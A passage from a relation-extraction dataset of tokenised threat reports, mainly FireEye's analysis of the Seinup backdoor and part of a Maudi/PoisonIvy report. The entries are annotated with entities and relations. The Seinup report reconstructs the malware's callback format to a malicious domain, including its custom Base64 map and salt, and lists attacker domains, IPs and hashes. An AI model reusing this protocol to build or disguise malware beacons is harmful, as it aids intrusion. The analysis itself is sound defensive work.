"Dropper"}], [{"name": "wab.exe", "pos": [1, 2], "sent_id": 38, "type": "Malware"}], [{"name": "wab32res.dll", "pos": [2, 3], "sent_id": 38, "type": "Malware"}], [{"name": "msnetrsvw.exe", "pos": [3, 4], "sent_id": 38, "type": "Malware"}], [{"name": "137F3D11559E9D986D510AF34CB61FBC", "pos": [2, 3], "sent_id": 40, "type": "MD5"}], [{"name": "CE67AAA163A4915BA408B2C1D5CCC7CC", "pos": [4, 5], "sent_id": 40, "type": "MD5"}], [{"name": "FB2FA42F052D0A86CBDCE03F5C46DD4D", "pos": [9, 10], "sent_id": 40, "type": "MD5"}], [{"name": "FB2FA42F052D0A86CBDCE03F5C46DD4D", "pos": [0, 1], "sent_id": 42, "type": "MD5"}], [{"name": "baf227a9f0b21e710c65d01f2ab01244", "pos": [0, 1], "sent_id": 45, "type": "MD5"}], [{"name": "0845f03d669e24144df785ee54f6ad74", "pos": [4, 5], "sent_id": 45, "type": "MD5"}], [{"name": "d64a22ea3accc712aebaa047ab818b07", "pos": [3, 4], "sent_id": 46, "type": "MD5"}], [{"name": "56e6c27f9952e79d57d0b32d16c26811", "pos": [0, 1], "sent_id": 48, "type": "MD5"}], [{"name": "cdd969121a2e755ef3dc1a7bf7f18b24", "pos": [3, 4], "sent_id": 49, "type": "MD5"}], [{"name": "709c71c128a876b73d034cde5e3ec1d3", "pos": [3, 4], "sent_id": 50, "type": "MD5"}], [{"name": "hardware SSL decrypter", "pos": [14, 17], "sent_id": 55, "type": "CourseOfAction"}], [{"name": "exp1ore.exe", "pos": [23, 24], "sent_id": 65, "type": "Malware"}], [{"name": "Wor.doc", "pos": [26, 27], "sent_id": 65, "type": "File"}], [{"name": "exp1ore.exe", "pos": [1, 2], "sent_id": 66, "type": "Malware"}], [{"name": "Wor.doc", "pos": [3, 4], "sent_id": 66, "type": "File"}], [{"name": "0xFC", "pos": [17, 18], "sent_id": 66, "type": "Obfuscation"}]], "labels": [{"r": "P13", "h": 23, "t": 21, "evidence": [16, 20]}, {"r": "P13", "h": 23, "t": 18, "evidence": [15, 20]}, {"r": "P13", "h": 23, "t": 22, "evidence": [17, 20]}, {"r": "P13", "h": 23, "t": 19, "evidence": [15, 20]}, {"r": "P13", "h": 23, "t": 20, "evidence": [16, 20]}, {"r": "P13", "h": 17, "t": 18, "evidence": [14, 15]}, {"r": "P13", "h": 17, "t": 19, "evidence": [14, 15]}, {"r": "P21", "h": 24, "t": 23, "evidence": [20, 27]}, {"r": "P21", "h": 25, "t": 23, "evidence": [20, 28]}, {"r": "P21", "h": 51, "t": 47, "evidence": [38, 40]}, {"r": "P21", "h": 52, "t": 48, "evidence": [38, 40]}, {"r": "P21", "h": 53, "t": 49, "evidence": [38, 40]}, {"r": "P21", "h": 54, "t": 50, "evidence": [38, 42]}, {"r": "P21", "h": 63, "t": 62, "evidence": [65]}, {"r": "P21", "h": 65, "t": 64, "evidence": [66]}, {"r": "P13", "h": 64, "t": 66, "evidence": [66]}, {"r": "P28", "h": 23, "t": 26, "evidence": [20, 28]}, {"r": "P28", "h": 23, "t": 27, "evidence": [20, 29]}, {"r": "P28", "h": 23, "t": 28, "evidence": [20, 30]}, {"r": "P28", "h": 23, "t": 29, "evidence": [20, 30]}, {"r": "P28", "h": 23, "t": 30, "evidence": [20, 31]}, {"r": "P28", "h": 23, "t": 31, "evidence": [20, 31]}, {"r": "P21", "h": 55, "t": 23, "evidence": [20, 45]}, {"r": "P21", "h": 56, "t": 23, "evidence": [20, 45]}, {"r": "P21", "h": 57, "t": 23, "evidence": [20, 46]}, {"r": "P21", "h": 58, "t": 23, "evidence": [20, 48]}, {"r": "P21", "h": 59, "t": 23, "evidence": [20, 49]}, {"r": "P21", "h": 60, "t": 23, "evidence": [20, 50]}, {"r": "P34", "h": 61, "t": 23, "evidence": [20, 55]}], "title": "201306FireEyeSeinUp", "sents": [["Trojan", ".", "APT.Seinup", "Hitting", "ASEAN", "1", "."], ["Executive", "Summary"], ["The", "FireEye", "research", "team", "has", "recently", "identified", "a", "number", "of", "spear", "phishing", "activities", "targeting", "Asia", "and", "ASEAN", "."], ["Of", "these", ",", "one", "of", "the", "spear", "phishing", "documents", "was", "suspected", "to", "have", "used", "a", "potentially", "stolen", "document", "as", "a", "decoy", "."], ["The", "rich", "and", "contextual", "details", "(", "body", "and", "metadata", ")", "which", "are", "not", "available", "online", "lead", "us", "to", "believe", "this", "was", "stolen", "."], ["This", "decoy", "document", "mentioned", "countries", "such", "as", "Brunei", ",", "Cambodia", ",", "Indonesia", ",", "Laos", ",", "Malaysia", ",", "Myanmar", ",", "Philippines", ",", "Singapore", ",", "Thailand", ",", "and", "Vietnam", ",", "which", "leads", "us", "to", "suspect", "that", "these", "countries", "are", "targeted", "."], ["As", "the", "content", "of", "this", "decoy", "document", "is", "suspected", "to", "be", "a", "stolen", "sensitive", "document", ",", "the", "details", "will", "not", "be", "published", "."], ["This", "malware", "was", "found", "to", "have", "used", "a", "number", "of", "advance", "techniques", "which", "makes", "it", "interesting", ":", "1", "."], ["The", "malware", "leverages", "Google", "Docs", "to", "perform", "redirection", "to", "evade", "callback", "detection", "."], ["This", "technique", "was", "also", "found", "in", "the", "malware", "dubbed", "\u201c", "Backdoor", ".", "Makadocs", "\u201d", "reported", "by", "Takashi", "Katsuki", "(", "Katsuki", ",", "2012", ")", "."], ["2", "."], ["It", "is", "heavily", "equipped", "with", "a", "variety", "of", "cryptographic", "functions", "to", "perform", "some", "of", "its", "functions", "securely", "."], ["3", "."], ["The", "malicious", "DLL", "is", "manually", "loaded", "into", "memory", "which", "hides", "from", "DLL", "listing", "."], ["As", "depicted", "in", "the", "diagram", "below", ",", "the", "spear", "phishing", "document", "(", "which", "exploits", "CVE-2012", "-", "0158", ")", "creates", "a", "decoy", "document", "and", "a", "malware", "dropper", "named", "exp1ore.exe", "."], ["This", "dropper", "will", "then", "drop", "wab.exe", "(", "Address", "Book", "Application", ")", "and", "wab32res.dll", "(", "malicious", "DLL", ")", "inside", "the", "temp", "folder", "."], ["By", "running", "wab.exe", ",", "the", "malicious", "DLL", "named", "wab32res.dll", "(", "located", "within", "the", "same", "folder", ")", "will", "be", "loaded", "using", "DLL", "side", "-", "loading", "technique", "."], ["This", "will", "in", "turn", "install", "a", "copy", "of", "wab32res.dll", "as", "msnetrsvw.exe", "inside", "the", "windows", "directory", "to", "be", "registered", "as", "Windows", "service", "."], ["By", "registering", "as", "a", "Windows", "service", ",", "it", "allows", "the", "malware", "to", "survive", "every", "reboot", "and", "persist", "on", "the", "network", "."], ["Figure", "1", "Infection", "Flow"], ["This", "malware", "is", "named", "\u201c", "Trojan", ".", "APT.Seinup", "\u201d", "because", "one", "of", "its", "export", "functions", "is", "named", "\u201c", "seinup", "\u201d", "."], ["This", "malware", "was", "analysed", "to", "be", "a", "backdoor", "that", "allows", "the", "attacker", "to", "remote", "control", "the", "infected", "system", "."], ["Figure", "2", "Exported", "Functions", "2", "."], ["Related", "APT", "Domain", "and", "MD5"], ["Based", "on", "our", "threat", "intelligence", "and", "reverse", "-", "engineering", "effort", ",", "below", "are", "some", "related", "domain", "and", "MD5", "sums", "."], ["Please", "note", "that", "some", "of", "the", "domain", "/", "IP", "association", "may", "change", "."], ["2.1", "."], ["Related", "Domain", "Domain", "/", "URL", "elizabearden.com", "Country", "Comments", "CN", "Registrar", ":", "XIN", "NET", "TECHNOLOGY", "CORPORATIONEmail", ":"], ["liangcheng04@sina.com", "symteconline.com", "IP", "124.172.243.211"], ["50.117.115.83"], ["50.117.115.84", "50.117.120.235"], ["69.46.84.51", "175.100.206.183", "winshell.net", "58.64.190.34", "HK", "philnewsonline.com", "www.info-week.com", "go-twitter.com"], ["50.93.198.128", "173.254.197.213", "50.93.198.113", "US", "US", "US", "dnsserviceonline.com", "CN", "Registrar", ":", "XIN", "NET", "TECHNOLOGY", "CORPORATIONEmail", ":", "liangcheng04@sina.com", "CN", "Registrar", ":", "XIN", "NET", "TECHNOLOGY", "CORPORATIONEmail", ":", "Smartwise9851@yahoo.com", "Registrar", ":"], ["SHANGHAI", "MEICHENG", "TECHNOLOGY", "INFORMATION", "DEVELOPMENT"], ["CO", ".", ",", "LTD.Email", ":", "richardmatind@yahoo.com", "Registrar", ":", "GODADDY.COM", ",", "LLCEmail", ":", "woooyeahh11@yahoo.com", "Registrar", ":", "GODADDY.COM", ",", "LLCEmail", ":"], ["woooyeahh11@yahoo.com"], ["Registrar", ":", "GODADDY.COM", ",", "LLCEmail", ":", "woooyeahh11@yahoo.com", "2.2", "."], ["Associated", "Files", "Name", "Spear", "-", "phishing", "document", "and", "decoy", "document"], ["iexp1ore.exe", "wab.exe", "wab32res.dll", "msnetrsvw.exe", "MD5"], ["CONFIDENTIAL"], ["Comments", "CONFIDENTIAL", "137F3D11559E9D986D510AF34CB61FBC", "Dropper", "CE67AAA163A4915BA408B2C1D5CCC7CC", "Benign", "Address", "Book", "Application", "FB2FA42F052D0A86CBDCE03F5C46DD4D", "Malware", "to", "be", "side", "loaded", "when", "wab.exe", "is", "launched", "."], ["Malware", "to", "be", "installed", "as", "a", "service", "."], ["FB2FA42F052D0A86CBDCE03F5C46DD4D"], ["Note", ":"], ["This", "is", "the", "same", "as", "wab32res.dll", "."], ["baf227a9f0b21e710c65d01f2ab01244", "Calls", "to", "www.elizabearden.com:80", "0845f03d669e24144df785ee54f6ad74"], ["Calls", "to", "www.dnsserviceonline.com:80", "d64a22ea3accc712aebaa047ab818b07"], ["Calls", "to", "www.elizabearden.com:80"], ["56e6c27f9952e79d57d0b32d16c26811"], ["Calls", "to", "www.elizabearden.com:80", "cdd969121a2e755ef3dc1a7bf7f18b24"], ["Calls", "to", "www.elizabearden.com:80", "709c71c128a876b73d034cde5e3ec1d3"], ["Calls", "to", "www.dnsserviceonline.com:80", "3", "."], ["Interesting", "Technical", "Observations", "3.1", "."], ["Redirection", "Using", "Google", "Docs"], ["By", "connecting", "the", "malicious", "server", "via", "Google", "Docs", ",", "the", "malicious", "communication", "is", "protected", "by", "the", "legitimate", "SSL", "provided", "by", "Google", "Docs", "(", "see", "Figure", "below", ")", "."], ["One", "possible", "way", "to", "examine", "the", "SSL", "traffic", "is", "to", "make", "use", "of", "a", "hardware", "SSL", "decrypter", "within", "an", "organisation", "."], ["Alternatively", ",", "you", "may", "want", "to", "examine", "the", "usage", "pattern", "of", "the", "users", "."], ["Suppose", "a", "particular", "user", "accesses", "Google", "Docs", "multiple", "times", "a", "day", ",", "the", "organization", "\u2019s", "Incident", "Response", "team", "may", "want", "to", "dig", "deeper", "to", "find", "out", "if", "the", "traffic", "is", "triggered", "by", "a", "human", "or", "by", "malware", "."], ["Figure", "3", "Retrieve", "Command", "via", "Google", "Docs"], ["Below", "is", "the", "code", "that", "is", "used", "to", "construct", "a", "URL", "that", "retrieves", "command", "via", "Google", "Docs", "."], ["First", ",", "the", "malicious", "URL", "is", "constructed", "and", "then", "encoded", "."], ["Next", ",", "the", "malware", "simply", "leverages", "the", "Google", "Docs", "viewer", "to", "retrieve", "the", "command", "from", "the", "malicious", "server", "(", "see", "Figure", "below", ")", "."], ["Figure", "4", "View", "Command", "via", "GoogleDocs", "3.2", "."], ["Zero", "-", "Skipping", "XOR", "Encryption"], ["The", "shellcode", "encryption", "technique", "is", "fairly", "standard", "."], ["The", "shellcode", "has", "a", "decryption", "stub", "which", "decrypts", "its", "body", "using", "the", "XOR", "key", "0x9E", ",", "and", "this", "shellcode", "is", "used", "to", "extract", "exp1ore.exe(malware", ")", "and", "Wor.doc", "(", "benign", "document", ")", "."], ["The", "exp1ore.exe", "and", "Wor.doc", "were", "found", "within", "the", "spear", "phishing", "document", "encrypted", "using", "the", "same", "key", "(", "0xFC", ")", "and", "technique", "."], ["The", "XOR", "key", "decrypts", "only", "a", "non", "-", "zero", "byte", "(", "see", "Figure", "5", ")", "."], ["This", "prevents", "statistical", "methods", "of", "recovering", "the", "XOR", "key", "."], ["The", "encrypted", "executable", "file", "and", "benign", "document", "were", "identified", "to", "be", "located", "inside", "the", "spear", "phishing", "document", "at", "offsets", "0\u00d72509", "and", "0\u00d743509", "respectively", "."], ["Figure", "5", "Zero", "Skipping", "XOR", "Encryption"], ["Even", "though", "statistical", "methods", "may", "not", "be", "useful", "in", "identifying", "the", "XOR", "key", "as", "the", "zero", "bytes", "are", "not", "encrypted", ",", "we", "could", "use", "some", "of", "the", "\u201c", "known", "\u201d", "strings", "below", "to", "hunt", "for", "the", "XOR", "key", "in", "this", "situation", "."], ["By", "sliding", "the", "known", "string", "across", "the", "array", "of", "bytes", "to", "perform", "a", "windowed", "XOR", ",", "the", "key", "would", "be", "revealed", "when", "the", "encoded", "data", "is", "XORed", "with", "the", "known", "string", "."], ["\u201c", "This", "program", "can", "not", "be", "run", "in", "DOS", "mode", "\u201d"], ["\u201c", "KERNEL32.dll", "\u201d", "\u201c", "LoadLibraryA", "\u201d", "3.3", "."], ["Deployment", "of", "Various", "Cryptographic", "Functions", "3.3.1", "."], ["Secure", "Callback"], ["The", "malware", "performs", "the", "callback", "in", "a", "secure", "manner", "."], ["It", "uses", "a", "custom", "Base64", "map", "to", "encode", "its", "data", ",", "and", "creates", "a", "salted", "digital", "thumbprint", "to", "allow", "validation", "of", "data", "."], ["Below", "describes", "the", "steps", "to", "validate", "a", "callback", "using", "an", "example", "of", "the", "following", "URL", ":", "hxxp://www.elizabearden.com/waterphp/BYyH.php", "?"], ["dEIXozUlFzx=5P&wDq=6QeZky42OCQOLQuZ6dC2LQ7F56iAv6GpH6S+w8npH5oAZk==&k4fJdSp7", "=", "cc3237bc79192a096440faca0fdae10&GvQF2lotIr5bT2="], ["The", "URL", "could", "be", "generalised", "as", "follows", ":"], ["Domain/<PHP>?<rand", "11", "-", "13", "char>=<A\u2019>&<rand", "3", "-", "5", "char>=<B\u2019>&<rand", "7", "-", "9", "char>=<C\u2019>&<rand", "14", "-", "16", "chars>=<D", "\u2019", ">"], ["The", "definition", "of", "A", "\u2019", ",", "B", "\u2019", ",", "C", "\u2019", "and", "D", "\u2019", "are", "as", "follows", ":"], ["Let", "H", "be", "the", "function", "which", "encodes", "binary", "into", "hexadecimal", "characters", "prepend", "with", "\u201c", "%", "\u201d", ",", "if", "it", "is", "not", "alphanumeric", ",", "dash", ",", "underscore", "or", "dot", "."], ["Let", "B64", "be", "the", "base", "64", "encoder", "using", "the", "following", "custom", "map", ",", "\u201c", "URPBnCF1GuJwH2vbkLN6OQ/5S9TVxXKZaMc8defgiWjmo7pqrAstyz0D+El3I4hY", "\u201d", "."], ["Let", "PT", "be", "the", "plain", "text", "which", "is", "in", "the", "form", "of", "\u201c", "<", "HostName>[<RunType>]:<IPAddress>{1", "}", "\u201d", ",", "where", "HostName", "and", "IPAddress", "are", "string", ",", "and", "RunType", "is", "a", "character", "."], ["Let", "A", "be", "the", "random", "of", "3", "to", "7", "characters", ",", "and", "A", "\u2019", "=", "H(A", ")"], ["Let", "B", "be", "B64", "(", "PT", ")", ",", "and", "B", "\u2019", "=", "H(B", ")"], ["Let", "C", "be", "32", "char", "deliminator", ",", "and", "C", "\u2019", "=", "H(C", ")"], ["Let", "D", "be", "H", "(", "MD5", "(", "salt", "+", "MD5", "(", "B64(PT", ")", "+", "A", "+", "C", ")", ")", ")", ",", "salt", "=", "\u201c", "%", "^^*HFH)*$FJK)234sd2N@C(JGl2z94cg23\u2033", ",", "and", "D", "\u2019", "=", "H(D", ")"], ["Hence", ",", "in", "this", "case", ",", "the", "specific", "malicious", "URL", "could", "be", "applied", "as", "follows", ":"], ["Domain/<PHP", ">", "=", "http://www.elizabearden.com/waterphp/BYyH.php"], ["A", "\u2019", "=", "\u201c", "5Pb", "\u201d", "B", "\u2019", "=", "\u201c", "6QeZky42OCQOLQuZ6dC2LQ7F56iAv6GpH6S%2Bw8npH5oAZk==", "\u201d", "C", "\u2019", "=", "\u201c", "cc3237bc79192a096440faca0fdae107", "\u201d", "D", "\u2019", "=", "\u201c", "349118df672db38f9e65659874b60b27", "\u201d", "(", "This", "is", "the", "digital", "signature", ")"], ["The", "hash", "could", "be", "verified", "as", "follow", ":", "B64(PT", ")"], ["+", "A", "+", "C", "=", "\u201c", "6QeZky42OCQOLQuZ6dC2LQ7F56iAv6GpH6S+w8npH5oAZk==", "\u201d", "+", "\u201c", "5Pb", "\u201d", "+", "\u201c", "cc3237bc79192a096440faca0fdae107", "\u201d", "MD5", "(", "B64(PT", ")", "+", "A", "+", "C", ")", "="], ["\u201c", "766cf9e96c1a508c59f7ade1c50ecd28", "\u201d"], ["MD5", "(", "salt", "+", "MD5(B64(PT", ")", "+", "A", "+", "C", ")", ")", "="], ["MD5", "(", "\u201c", "%", "^^*HFH)*$FJK)234sd2N@C(JGl2z94cg23", "\u201d", "+", "\u201c", "766cf9e96c1a508c59f7ade1c50ecd28", "\u201d", ")", "="], ["349118df672db38f9e65659874b60b27"], ["(", "This", "equals", "to", "D", "\u2019", ",", "which", "means", "verified", ")"], ["The", "encoded", "plain", "text", "(", "B", ")", "could", "be", "recovered", ":", "B64(PT", ")", "=", "\u201c", "6QeZky42OCQOLQuZ6dC2LQ7F56iAv6GpH6S+w8npH5oAZk==", "\u201d", ";", "PT", "=", "\u201c", "MY_COMPUTER_NAME[F]:192.168.1.1{1", "}", "\u201d", ",", "where", "\u201c", "MY_COMPUTER_NAME", "\u201d", "is", "the", "hostname", ",", "\u2018", "F", "\u2019", "is", "the", "run", "type", ",", "\u201c", "192.168.1.1", "\u201d", "is", "the", "IP", "address", "."], ["Note", ":", "This", "example", "is", "mocked", "up", "using", "a", "dummy", "computer", "name", "and", "IP", "address", "."], ["The", "python", "code", "below", "could", "be", "used", "to", "decode", "the", "custom", "encoded", "string", "(", "see", "Figure", "below", ")", "."], ["Figure", "6", "Python", "to", "Decode", "a", "Custom", "Base", "64", "3.3.2", "."], ["Random", "Generator", "Using", "Mersenne", "Twister", "Algorithm"], ["The", "malware", "was", "found", "to", "perform", "a", "callback", "at", "random", "intervals", "so", "as", "to", "evade", "network", "investigation", "when", "looking", "for", "network", "connections", "that", "are", "performed", "in", "a", "regular", "interval", "."], ["Additionally", ",", "even", "the", "name", "of", "the", "parameters", "in", "the", "get", "string", "have", "a", "random", "length", "and", "name", ",", "which", "makes", "it", "hard", "to", "create", "a", "fix", "signature", "to", "detect", "such", "callbacks", "(", "see", "3.3.1", "to", "understand", "how", "a", "callback", "is", "created", ")", "."], ["Figure", "7", "Mersenne", "Twister", "Algorithm", "Seeding", "function", "3.4", "."], ["In", "-", "Memory", "Only", "Malicious", "Code"], ["On", "the", "disk", ",", "the", "malicious", "code", "is", "either", "encrypted", "or", "compressed", "to", "evade", "scanning", "using", "signature", "rules", "."], ["Only", "upon", "being", "loaded", "into", "memory", ",", "does", "the", "malicious", "code"], ["(", "that", "appears", "to", "be", "in", "the", "form", "of", "a", "DLL", ")", "get", "manually", "loaded", "without", "the", "use", "of", "Windows", "32", "API", "."], ["In", "this", "way", ",", "when", "an", "investigation", "is", "performed", ",", "the", "malicious", "DLL", "is", "not", "revealed", "."], ["Additionally", ",", "it", "makes", "it", "much", "harder", "for", "analysis", "to", "be", "performed", "."], ["Figure", "8", "Segments", "in", "the", "memory", "which", "contains", "the", "malicious", "code"], ["Taking", "a", "deeper", "look", "at", "the", "decrypted", "malicious", "code", ",", "this", "malware", "was", "found", "to", "contain", "at", "least", "the", "following", "functions", ":", "Download", "file", "Download", "and", "execute", "or", "load", "library"], ["Change", "sleep", "duration"], ["Open", "and", "close", "interactive", "sessions", "4", "."], ["Conclusion", "Malware", "is", "increasingly", "becoming", "more", "contextually", "advanced", "."], ["It", "attempts", "to", "appear", "as", "much", "as", "possible", "like", "legitimate", "software", "or", "documents", "."], ["In", "this", "example", ",", "we", "would", "conclude", "the", "following", "."], ["1", "."], ["A", "potentially", "stolen", "document", "was", "used", "as", "a", "decoy", "document", "to", "increase", "its", "credibility", "."], ["It", "is", "also", "a", "sign", "that", "the", "compromised", "organisations", "could", "be", "used", "as", "a", "soft", "target", "to", "compromise", "their", "business", "partners", "and", "allies", "."], ["2", "."], ["It", "is", "important", "to", "put", "a", "stop", "to", "the", "malware", "infection", "at", "the", "very", "beginning", ",", "which", "is", "the", "exploitation", "phase", "."], ["Once", "a", "network", "is", "compromised", ",", "it", "is", "increasingly", "harder", "to", "detect", "such", "threats", "."], ["3", "."], ["Anti", "-", "incident", "response", "/", "forensic", "techniques", "are", "increasingly", "used", "to", "evade", "detection", "."], ["It", "would", "require", "a", "keen", "eye", "on", "details", "and", "a", "wealth", "of", "experience", "to", "identify", "all", "these", "advance", "techniques", "."], ["5", "."], ["Works", "Cited"], ["Carnegie", "Mellon", "University", "."], ["(", "n.d", ".", ")", "."], ["Retrieved", "from", "http://www.cs.cmu.edu/~fp/courses/15122-f10/misc/rand/mersenne.c0", "Katsuki", ",", "T.", "(", "19", "Nov", ",", "2012", ")", "."], ["Malware", "Targeting", "Windows", "8", "Uses", "Google", "Docs", "."], ["Retrieved", "from", "http://www.symantec.com/connect/blogs/malware-targeting-windows-8uses-google-docs-0"], ["I", "would", "like", "to", "thank", "several", "colleagues", "for", "their", "significant", "contributions", "on", "this", "post", ":", "Darien", "Kindlund", ",", "Ned", "Moran", ",", "Nart", "Villeneuve", ",", "and", "Thoufique", "Haq", "."]]}, {"vertexSet": [[{"name": "Maudi", "pos": [6, 7], "sent_id": 1, "type": "Malware"}], [{"name": "Maudi", "pos": [0, 1], "sent_id": 3, "type": "Malware"}], [{"name": "Maudi", "pos": [20, 21], "sent_id": 4, "type": "Malware"}], [{"name": "PoisonIvy", "pos": [22, 23], "sent_id": 4, "type": "Malware"}], [{"name": "Maudi", "pos": [5, 6], "sent_id": 5, "type": "TrojanHorse"}], [{"name": "2009", "pos": [23, 24], "sent_id": 6, "type": "Time"}], [{"name": "msacm32.drv", "pos": [14, 15], "sent_id": 10, "type": "Payload"}], [{"name": "ntshrui.dll", "pos": [16, 17], "sent_id": 10, "type": "Payload"}], [{"name": "wdmaud.drv", "pos": [18, 19], "sent_id": 10, "type": "Payload"}], [{"name": "user.dat", "pos": [32, 33], "sent_id": 10, "type": "Payload"}], [{"name": "user.db", "pos": [34, 35], "sent_id": 10, "type": "Payload"}], [{"name": "temp.db", "pos": [36, 37], "sent_id": 10, "type": "Payload"}], [{"name": "user.dat", "pos": [12, 13], "sent_id": 13, "type": "File"}], [{"name": "xor-encoded", "pos": [11, 14], "sent_id": 16, "type": "Obfuscation"}], [{"name": "171088046.gnway.org", "pos": [2, 3], "sent_id": 20, "type": "Indicator"}], [{"name": "171088046.gnway.org", "pos": [2, 3], "sent_id": 20, "type": "Indicator"}], [{"name": "Camellia 256-bit block cipher", "pos": [11, 17], "sent_id": 21, "type": "Obfuscation"}], [{"name": "admin", "pos": [22, 23], "sent_id": 22, "type": "Password"}], [{"name": "20110105110", "pos": [0, 1], "sent_id": 27, "type": "Password"}], [{"name": "12345678901", "pos": [1, 2], "sent_id": 27, "type": "Password"}], [{"name": "beijing2011", "pos": [2, 3], "sent_id": 27, "type": "Password"}], [{"name": "41232619820", "pos": [3, 4], "sent_id": 27, "type": "Password"}], [{"name": "20110228001", "pos": [4, 5], "sent_id": 27, "type": "Password"}], [{"name": "20110000000", "pos": [5, 6], "sent_id": 27, "type": "Password"}], [{"name": "11111111111", "pos": [6, 7], "sent_id": 27, "type": "Password"}], [{"name": "Maudi", "pos": [11, 12], "sent_id": 28, "type": "Malware"}], [{"name": "WWW.CeleWare.NET", "pos": [12, 15], "sent_id": 30, "type": "Indicator"}], [{"name": "WWW.AeleWare.NET", "pos": [18, 21], "sent_id": 30, "type": "Indicator"}], [{"name": "DataBase@Hotmail.com", "pos": [36, 37], "sent_id": 34, "type": "Indicator"}], [{"name": "Maudi", "pos": [42, 43], "sent_id": 34, "type": "Malware"}], [{"name": "MogolSoft@Hotmail.com", "pos": [46, 47], "sent_id": 34, "type": "Indicator"}], [{"name": "SoftSign@HotMail.com", "pos": [50, 51], "sent_id": 34, "type": "Indicator"}], [{"name": "Maudi", "pos": [12, 13], "sent_id": 39, "type": "Malware"}], [{"name": "p.hannmaill.net", "pos": [2, 3], "sent_id": 40, "type": "Indicator"}], [{"name": "p.hannmaill.net", "pos": [2, 3], "sent_id": 40, "type": "Indicator"}], [{"name": "p.hannmaill.net", "pos": [2, 3], "sent_id": 40, "type": "Indicator"}], [{"name": "p.hannmaill.net", "pos": [2, 3], "sent_id": 40, "type": "Indicator"}], [{"name": "p.hannmaill.net", "pos": [8, 9], "sent_id": 41, "type": "Indicator"}], [{"name": "s.hiinet.net", "pos": [10, 11], "sent_id": 41, "type": "Indicator"}], [{"name": "s.hiinet.net", "pos": [10, 11], "sent_id": 41, "type": "Indicator"}], [{"name": "s.hiinet.net", "pos": [10, 11], "sent_id": 41, "type": "Indicator"}], [{"name": "s.hiinet.net", "pos": [10, 11], "sent_id": 41, "type": "Indicator"}], [{"name": "s.hiinet.net", "pos": [10, 11], "sent_id": 41, "type": "Indicator"}], [{"name": "sofoxman@gmail.com", "pos": [9, 10], "sent_id": 42, "type": "Email"}], [{"name": "Maudi", "pos": [13, 14], "sent_id": 52, "type": "Malware"}], [{"name": "Maudi", "pos": [1, 2], "sent_id": 53, "type": "Malware"}], [{"name": "domestic Chinese targets", "pos": [12, 15], "sent_id": 59, "type": "ExploitTargetObject"}], [{"name": "human rights activists", "pos": [16, 19], "sent_id": 59, "type": "ExploitTargetObject"}], [{"name": "Maudi", "pos": [23, 24], "sent_id": 61, "type": "Malware"}], [{"name": "readme.pdf", "pos": [16, 17], "sent_id": 62, "type": "Payload"}], [{"name": "72bdca7dd12ed04b21dfa60c5c2ab6c4", "pos": [19, 20], "sent_id": 62, "type": "MD5"}], [{"name": "ec16143a14c091100e7af30de03fce1f", "pos": [30, 31], "sent_id": 62, "type": "MD5"}], [{"name": "www.humanright-watch.org", "pos": [35, 36], "sent_id": 62, "type": "Indicator"}], [{"name": "Maudi", "pos": [5, 6], "sent_id": 63, "type": "Dropper"}], [{"name": "soft@hotmail.com", "pos": [15, 16], "sent_id": 63, "type": "Indicator"}], [{"name": "JinDiQIAO@hotmail.com", "pos": [26, 27], "sent_id": 63, "type": "Indicator"}], [{"name": "Mongolia", "pos": [0, 1], "sent_id": 64, "type": "ExploitTargetObject"}], [{"name": "Mongolia", "pos": [22, 23], "sent_id": 66, "type": "ExploitTargetObject"}], [{"name": "Mongolia", "pos": [0, 1], "sent_id": 67, "type": "ExploitTargetObject"}], [{"name": "Maudi", "pos": [3, 4], "sent_id": 72, "type": "Malware"}], [{"name": "mogolsoft@hotmail.com", "pos": [15, 16], "sent_id": 72, "type": "Indicator"}], [{"name": "mol-goverment.com", "pos": [8, 9], "sent_id": 73, "type": "Indicator"}], [{"name": "hlemonk@163.com", "pos": [11, 12], "sent_id": 74, "type": "ExploitTargetObject"}], [{"name": "goodmongol.com", "pos": [25, 26], "sent_id": 74, "type": "Indicator"}], [{"name": "Maudi", "pos": [1, 2], "sent_id": 76, "type": "Malware"}], [{"name": "bodologetee.com", "pos": [3, 4], "sent_id": 76, "type": "Indicator"}], [{"name": "mongolianews@yahoo.com", "pos": [10, 11], "sent_id": 76, "type": "Email"}], [{"name": "cc1a806d25982acdb35dd196ab8171bc", "pos": [6, 7], "sent_id": 77, "type": "MD5"}], [{"name": "CVE-2012-0158", "pos": [20, 23], "sent_id": 77, "type": "Vulnerability"}], [{"name": "ppt.bodologetee.com", "pos": [32, 33], "sent_id": 77, "type": "Indicator"}], [{"name": "Maudi", "pos": [6, 7], "sent_id": 80, "type": "Malware"}], [{"name": "o qwer.wekby.com", "pos": [0, 2], "sent_id": 81, "type": "Indicator"}], [{"name": "qwer.wekby.com", "pos": [1, 2], "sent_id": 81, "type": "Indicator"}], [{"name": "qwer.wekby.com", "pos": [1, 2], "sent_id": 81, "type": "Indicator"}], [{"name": "qwer.wekby.com", "pos": [1, 2], "sent_id": 81, "type": "Indicator"}], [{"name": "28b5241ca13603636dbf626792231161", "pos": [9, 10], "sent_id": 83, "type": "MD5"}], [{"name": "28b5241ca13603636dbf626792231161", "pos": [9, 10], "sent_id": 83, "type": "MD5"}], [{"name": "6a83dc3f53079e17ecc49cbc0dacc8f5", "pos": [12, 13], "sent_id": 83, "type": "MD5"}], [{"name": "6a83dc3f53079e17ecc49cbc0dacc8f5", "pos": [12, 13], "sent_id": 83, "type": "MD5"}], [{"name": "cf45dbdb3718b4b728c2dd894032464b", "pos": [15, 16], "sent_id": 83, "type": "MD5"}], [{"name": "cf45dbdb3718b4b728c2dd894032464b", "pos": [15, 16], "sent_id": 83, "type": "MD5"}], [{"name": "PoisonIvy", "pos": [28, 29], "sent_id": 83, "type": "MalwareFamily"}], [{"name": "o jeno_1980@hotmail.com", "pos": [0, 2], "sent_id": 84, "type": "Email"}], [{"name": "ns2.adultstick.com", "pos": [4, 5], "sent_id": 86, "type": "Indicator"}], [{"name": "ns2.adultstick.com", "pos": [4, 5], "sent_id": 86, "type": "Indicator"}], [{"name": "ns2.adultstick.com", "pos": [4, 5], "sent_id": 86, "type": "Indicator"}], [{"name": "Mirage", "pos": [19, 20], "sent_id": 87, "type": "Campaign"}], [{"name": "Sin Digoo", "pos": [24, 26], "sent_id": 87, "type": "Campaign"}], [{"name": "7d36ad6aafbf1f9496ccc6ac1a8bb57e", "pos": [0, 1], "sent_id": 88, "type": "MD5"}], [{"name": "7d36ad6aafbf1f9496ccc6ac1a8bb57e", "pos": [0, 1], "sent_id": 88, "type": "MD5"}], [{"name": "64718689ee3ff695c55ea1ec213434d1", "pos": [0, 1], "sent_id": 89, "type": "MD5"}], [{"name": "64718689ee3ff695c55ea1ec213434d1", "pos": [0, 1], "sent_id": 